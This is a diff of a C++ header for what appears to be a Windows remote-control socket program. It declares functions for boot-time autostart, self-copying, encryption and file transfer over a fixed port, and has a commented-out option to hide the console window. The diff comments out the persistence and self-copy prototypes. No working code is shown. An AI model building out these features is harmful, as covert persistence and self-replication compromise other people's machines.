@@ -14,12 +14,13 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <thread>
+#include <unistd.h>
 #include <atlimage.h>
 #include <stdint.h>
 #include <Windows.h>
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
-
+#define FILE_NAME_MAX_SIZE 260
 //不显示控制台黑色窗口
 //#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #define PORT 65533
@@ -39,7 +40,6 @@ static const uint8_t BASE32_REVERSE_MAP[] =
 #define CEIL_POS(X) (X > (uint64_t)(X) ? (uint64_t)(X+1) : (uint64_t)(X))
 #endif
 using namespace std;
-
 struct PC_Message
 {
 	char PCName[BUFSIZ];
@@ -72,13 +72,13 @@ void base64decode(char* str);
 void encode(char* text);
 //解密函数
 void decode(char* pwd);
-//开机自启动
-int ComputerStart(char* pathName);
-//char转换为lpwstr
-LPWSTR CharToLPWSTR(const char* szString);
-//自我复制
-int copySelf(char* path);
-//获取文件名
-void GetFileName(SOCKET fd, char FileName[Row], char* str);
+////开机自启动
+//int ComputerStart(char* pathName);
+////char转换为lpwstr
+//LPWSTR CharToLPWSTR(const char* szString);
+////自我复制
+//int copySelf(char* path);
+////获取文件名
+void GetFileName(SOCKET fd, char* command, char* res);
 
 #endif // !_TCPSOCKET_H
